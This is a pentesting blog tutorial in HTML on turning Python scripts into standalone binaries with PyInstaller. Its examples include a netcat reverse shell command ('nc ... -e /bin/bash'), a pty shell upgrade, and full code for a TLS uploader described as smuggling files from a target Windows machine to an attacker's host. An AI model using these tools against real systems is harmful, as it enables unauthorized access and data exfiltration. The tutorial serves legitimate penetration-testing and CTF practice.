@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8" />
+        <title>secoats | Tutorial: Create Binary Versions of Python Tools</title>
+        <link rel="canonical" href="https://secoats.github.io/posts/pyinstaller.html" />
+        <meta name="description" content="Ramblings about InfoSec, Pentesting, CTF and Tools" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <meta name="google-site-verification" content="ec3XZVmgp3ZOsiLB8riLA-9B5kVJVR_71u11vmIMs4w" />
+        <meta property="og:type" content="article" />
+        <meta property="og:locale" content="en_US" />
+        <meta property="og:site_name" content="secoats" />
+        <meta property="og:title" content="Tutorial: Create Binary Versions of Python Tools" />
+        <meta property="og:url" content="https://secoats.github.io/posts/pyinstaller.html" />
+        <meta name="author" content="secoats">
+        <meta property="article:author" content="secoats">
+        <link rel="stylesheet" href="/assets/css/main.css" />
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" />
+    </head>
+    <body>
+        <div id="main">
+            <div id="header">
+                <div id="masthead" class="wrapper">
+                    <span class="site-title">
+                        <a href="/">secoats</a>
+                    </span>
+                    <span class="main-nav">
+                        <a href="/posts.html">Posts</a>
+<a href="/categories.html#writeup">Writeups</a>
+<a href="/categories.html#tutorial">Tutorials</a>
+                    </span>
+                </div>
+            </div>
+            <main id="content" class="wrapper">
+                <article class="mbox">
+                    <h1 class="article-headline">Tutorial: Create Binary Versions of Python Tools</h1>
+                    <p class="article-subline">
+                        <span class="article-meta-reading-time"><i class="far fa-clock" aria-hidden="true"></i> 5 minute read</span> - <span class="article-meta-published">November 07, 2020</span>
+                    </p>
+                    <p><strong>PyInstaller</strong> allows you to create stand-alone binaries that run on machines that do not have Python installed.</p>
+<p>On Linux it will create an executable <a href="https://en.wikipedia.org/wiki/Executable_and_Linkable_Format">ELF binary</a>.<br/>
+On Windows it creates a <a href="https://en.wikipedia.org/wiki/Portable_Executable">PE32</a> or PE32+ exe.  </p>
+<p>This created binary will include the python interpreter, so the minimum file size for a 64bit ELF binary is around 4 MB and the Windows equivalent is around 6 MB.  </p>
+<p>So the file size is noticeably big, especially if you just wanted to turn a small script into a binary. But the time saved in not having to rewrite your program in a compiled language like C might be worth it.</p>
+<h2 id="cross-compiling">Cross-Compiling<a class="headerlink" href="#cross-compiling" title="Permanent link"> </a></h2>
+<p>Here are the bad news: there is no cross-compiling build-in.<br/>
+If you want to create Windows binaries, then you will have to run PyInstaller on Windows and the same is true for Linux.  </p>
+<p>Also please note that it <strong>does</strong> matter whether you use the 32bit or 64bit version of the Python interpreter. Using the 64bit Linux interpreter results in a 64bit ELF binary.</p>
+<p>But I assume you have some VM's or Docker containers lying around that can be used.<br/>
+<a href="https://stackoverflow.com/a/35605479">Wine might also work</a>, but I have not tried that.</p>
+<h2 id="install">Install<a class="headerlink" href="#install" title="Permanent link"> </a></h2>
+<p>On Linux you can use <code>pip3 install PyInstaller</code> for the Python 3.x version or <code>pip install PyInstaller</code> for the old 2.7 version.</p>
+<p>On Windows you can also just use <code>python.exe -m pip install PyInstaller</code>.</p>
+<p>Binaries are also available <a href="https://www.pyinstaller.org/downloads.html#id1">over here on their website</a>.</p>
+<p>I will use the 3+ version of Python for the following examples. But the process should be the same regardless of what version you use. Just make sure the Interpreter you use for compiling the binary is the same one the script would normally use.</p>
+<h2 id="example-upgrade-a-linux-reverse-shell">Example: Upgrade a Linux Reverse Shell<a class="headerlink" href="#example-upgrade-a-linux-reverse-shell" title="Permanent link"> </a></h2>
+<p>If you have done some HackTheBox, then you have probably encountered this python snippet before: </p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>python3 -c <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+</code></pre></div></div></div>
+<p>This spawns a fully interactive pseudo-terminal that allows you to run commands such as <code>su</code> or <code>sudo</code>, which can be pretty handy if you are stuck with a semi-interactive reverse shell.</p>
+<p>There are other ways to spawn a fully-interactive shell besides python, but this will do as a simple example.</p>
+<p>Let's create a standalone-binary version of this snippet.</p>
+<p>First create a python script file <code>upgrade.py</code>:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="c1"># upgrade.py</span>
+<span class="kn">import</span> <span class="nn">pty</span>
+<span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s2">"/bin/bash"</span><span class="p">)</span>
+</code></pre></div></div></div>
+<p>Use the following command in order to create a pyinstaller binary:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>pyinstaller --onefile upgrade.py
+</code></pre></div></div></div>
+<p>The <code>--onefile</code> parameter tells pyinstaller that all libraries should be packed into the binary.</p>
+<p>If this finishes successfully, then you will find the created binary in the /dist subfolder.</p>
+<h3 id="does-it-work">Does It Work?<a class="headerlink" href="#does-it-work" title="Permanent link"> </a></h3>
+<p>Make sure the created <code>upgrade</code> binary is executable (<code>chmod +x upgrade</code>).</p>
+<p>Listen for a shell with netcat:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>nc -vlnp <span class="m">4455</span>
+</code></pre></div></div></div>
+<p>We will simulate a reverse shell as user www-data using sudo.<br/>
+This of course assumes you have such a user on your system and the required sudo permissions.  </p>
+<p>Do this in a second shell:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>sudo -u www-data bash -c <span class="s2">"/usr/bin/nc localhost 4455 -e /bin/bash"</span>
+</code></pre></div></div></div>
+<p>In the first terminal you will receive the semi-interactive netcat reverse shell (added new lines for clarity):</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>$ nc -vlnp <span class="m">4455</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4455</span> ...
+connect to <span class="o">[</span><span class="m">127</span>.0.0.1<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span><span class="m">127</span>.0.0.1<span class="o">]</span> <span class="m">33470</span>
+
+whoami
+www-data
+
+tty
+not a tty
+
+ls -l
+total <span class="m">4000</span>
+-rwxr-xr-x <span class="m">1</span> kali kali <span class="m">4092904</span> Jan <span class="m">15</span> <span class="m">19</span>:42 upgrade
+</code></pre></div></div></div>
+<p>Run our binary in this reverse shell:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>./upgrade
+www-data@kali:/tmp/upgrade/dist$ tty
+tty
+/dev/pts/2
+
+www-data@kali:/tmp/upgrade/dist$ su kali
+su kali
+Password: hunter2
+
+kali@kali:/tmp/upgrade/dist$ whoami
+whoami
+kali
+</code></pre></div></div></div>
+<p>The <code>tty</code> command confirms our upgraded shell counts as a terminal. You should be able to execute interactive commands like <code>su</code> now.</p>
+<h2 id="example-file-upload-on-windows">Example: File Upload On Windows<a class="headerlink" href="#example-file-upload-on-windows" title="Permanent link"> </a></h2>
+<p>Here is an example for Windows. The process is pretty much the same.</p>
+<p>Let us smuggle out some files from a Windows machine using a TLS encrypted connection.</p>
+<p>This is the server we will use to receive the file (does not need to be compiled).<br/>
+Save it as <code>receiver.py</code>:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="c1"># -TLS Reverse Connect File Receiver-</span>
+<span class="c1"># U+0A75</span>
+<span class="c1"># Create cert and key:</span>
+<span class="c1"># openssl req -new -newkey rsa:4096 -days 730 -nodes -x509 -keyout server.key -out server.cert</span>
+<span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">ssl</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">):</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"params: &lt;listen_port&gt; &lt;output_filename&gt;"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="n">PORT</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+<span class="n">FILENAME</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+<span class="n">CERT</span> <span class="o">=</span> <span class="s2">"server.cert"</span>
+<span class="n">KEY</span> <span class="o">=</span> <span class="s2">"server.key"</span>
+<span class="n">HOST</span> <span class="o">=</span> <span class="s2">"0.0.0.0"</span>
+<span class="n">TIMEOUT</span> <span class="o">=</span> <span class="mi">20</span> <span class="c1"># seconds</span>
+
+<span class="n">context</span> <span class="o">=</span> <span class="n">ssl</span><span class="o">.</span><span class="n">create_default_context</span><span class="p">(</span><span class="n">ssl</span><span class="o">.</span><span class="n">Purpose</span><span class="o">.</span><span class="n">CLIENT_AUTH</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">load_cert_chain</span><span class="p">(</span><span class="n">certfile</span><span class="o">=</span><span class="n">CERT</span><span class="p">,</span> <span class="n">keyfile</span><span class="o">=</span><span class="n">KEY</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">options</span> <span class="o">|=</span> <span class="n">ssl</span><span class="o">.</span><span class="n">OP_NO_SSLv2</span> <span class="o">|</span> <span class="n">ssl</span><span class="o">.</span><span class="n">OP_NO_SSLv3</span> <span class="o">|</span> <span class="n">ssl</span><span class="o">.</span><span class="n">OP_NO_TLSv1</span> <span class="o">|</span> <span class="n">ssl</span><span class="o">.</span><span class="n">OP_NO_TLSv1_1</span> 
+<span class="n">context</span><span class="o">.</span><span class="n">set_ciphers</span><span class="p">(</span><span class="s1">'EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH'</span><span class="p">)</span>
+<span class="n">listener</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
+<span class="n">listener</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+<span class="n">listener</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
+<span class="n">listener</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># no backlog</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">"Listening..."</span><span class="p">)</span>
+
+<span class="n">incoming_socket</span><span class="p">,</span> <span class="n">incoming_addr</span> <span class="o">=</span> <span class="n">listener</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
+<span class="n">connection</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">wrap_socket</span><span class="p">(</span><span class="n">incoming_socket</span><span class="p">,</span> <span class="n">server_side</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+<span class="n">connection</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="n">TIMEOUT</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">"Accepted:"</span><span class="p">,</span> <span class="n">incoming_addr</span><span class="p">)</span>
+
+<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span> <span class="p">(</span><span class="n">FILENAME</span><span class="p">,</span> <span class="s2">"wb"</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">"Receiving..."</span><span class="p">)</span>
+<span class="n">received</span> <span class="o">=</span> <span class="n">connection</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="k">while</span> <span class="n">received</span><span class="p">:</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">received</span><span class="p">)</span>
+    <span class="n">received</span> <span class="o">=</span> <span class="n">connection</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">connection</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">listener</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">"Done"</span><span class="p">)</span>
+</code></pre></div></div></div>
+<p>Create a certificate and secret key for the server with:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>openssl req -new -newkey rsa:4096 -days <span class="m">730</span> -nodes -x509 -keyout server.key -out server.cert
+</code></pre></div></div></div>
+<p>Enter whatever you want to the prompts. 
+Make sure the created files are in the same directory as the <code>receiver.py</code> python script.</p>
+<p>Now comes the uploader we will compile for Windows. Save it as <code>uploader.py</code>:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="c1"># uploader.py</span>
+<span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">ssl</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">):</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"params: &lt;ip&gt; &lt;port&gt; &lt;filename&gt;"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
+<span class="n">FILENAME</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+
+<span class="n">context</span> <span class="o">=</span> <span class="n">ssl</span><span class="o">.</span><span class="n">SSLContext</span><span class="p">(</span><span class="n">ssl</span><span class="o">.</span><span class="n">PROTOCOL_TLSv1_2</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">check_hostname</span> <span class="o">=</span> <span class="kc">False</span>
+<span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">tls_sock</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">wrap_socket</span><span class="p">(</span><span class="n">sock</span><span class="p">)</span>
+<span class="n">tls_sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">"Connected"</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">"Sending..."</span><span class="p">)</span>
+<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span> <span class="p">(</span><span class="n">FILENAME</span><span class="p">,</span> <span class="s2">"rb"</span><span class="p">)</span>
+<span class="n">l</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="k">while</span> <span class="p">(</span><span class="n">l</span><span class="p">):</span>
+    <span class="n">tls_sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>
+    <span class="n">l</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">tls_sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span> 
+<span class="nb">print</span><span class="p">(</span><span class="s2">"Done"</span><span class="p">)</span>
+</code></pre></div></div></div>
+<p>Now on Windows compile <code>uploader.py</code>.</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code><span class="n">python</span><span class="p">.</span><span class="n">exe</span> <span class="n">-m</span> <span class="n">PyInstaller</span> <span class="p">-</span><span class="n">-onefile</span> <span class="n">uploader</span><span class="p">.</span><span class="n">py</span>
+</code></pre></div></div></div>
+<p>Once again you will find the created exe in the dist subfolder.</p>
+<p>Listen for a connection on your Linux machine with the receiver.py</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>python3 receiver.py <span class="m">5566</span> received_file.jpg
+</code></pre></div></div></div>
+<p>Then on the target machine execute the <code>upload</code> binary with the IP address of your linux machine. Here <code>some_file.jpg</code> is the path to the file you wish to upload.</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code><span class="p">.\</span><span class="n">upload</span><span class="p">.</span><span class="n">exe</span> <span class="n">10</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">42</span> <span class="n">5566</span> <span class="n">some_file</span><span class="p">.</span><span class="n">jpg</span>
+</code></pre></div></div></div>
+<p>You should receive the original JPEG file.<br/>
+You can confirm the two files are the same using md5sum.</p>
+<p>On Windows use: <code>certUtil -hashfile some_file.jpg MD5</code><br/>
+On Linux use: <code>md5sum some_file.jpg</code></p>
+<p>For example, the md5 sum of <a href="https://upload.wikimedia.org/wikipedia/commons/f/fa/Agra%2C_Taj_Mahal_LCCN95505064.jpg">this image</a> of the Taj Mahal is:<br/>
+<code>a6c706bab2af1f107fda6998dbc46a02</code></p>
+                    <div class="article-meta">
+                        <section class="article-share-section">
+                            <a href="https://twitter.com/intent/tweet?text=Tutorial%3A%20Create%20Binary%20Versions%20of%20Python%20Tools%20https%3A%2F%2Fsecoats.github.io%2Fposts%2Fpyinstaller.html" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+                            <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fsecoats.github.io%2Fposts%2Fpyinstaller.html" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+                            <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fsecoats.github.io%2Fposts%2Fpyinstaller.html" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+                          </section>
+                        <section class="article-meta-section">
+                            <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+                            <span itemprop="keywords">
+                                <a href="/tags.html#python" class="article-tag" rel="tag">python</a><span class="sep"> </span>
+                                <a href="/tags.html#pentesting" class="article-tag" rel="tag">pentesting</a><span class="sep"> </span>
+                                <a href="/tags.html#tools" class="article-tag" rel="tag">tools</a><span class="sep"> </span>
+                                <a href="/tags.html#linux" class="article-tag" rel="tag">linux</a><span class="sep"> </span>
+                                <a href="/tags.html#windows" class="article-tag" rel="tag">windows</a><span class="sep"> </span>
+                            </span>
+                        </section>
+                        <section class="article-meta-section">
+                            <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+                            <span itemprop="keywords">
+                                <a href="/categories.html#tutorial" class="article-tag" rel="tag">tutorial</a>
+                                <a href="/categories.html#programming" class="article-tag" rel="tag">programming</a>
+                            </span>
+                        </section>
+                        <section class="article-meta-section">
+                            <span style="margin-right:1em;"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Published:</strong> <time datetime="2020-11-07 15:34:30-04:00">November 07, 2020</time></span>
+                    
+                        </section> 
+                        <section class="article-meta-section">
+                            
+                            <span><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Last Updated:</strong> <time datetime="2020-12-07 15:34:30-04:00">December 07, 2020</time></span>
+                        </section>
+                    </div>
+                </article>
+            </main>
+            <div id="footerbar">
+                <footer class="wrapper">
+                    <div class="footer-info">
+                        <ul class="social-icons">
+    <li><a href="https://github.com/secoats" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+    <!--<li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>-->
+    <li><a href="https://twitter.com/cybercereals" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i> Twitter</a></li>
+</ul>
+<div class="copyright-notice">© 2021 secoats</div>
+                    </div>
+                </footer>
+            </div>
+        </div>
+        <script src="/assets/js/main.js"></script>
+    </body>
+</html>
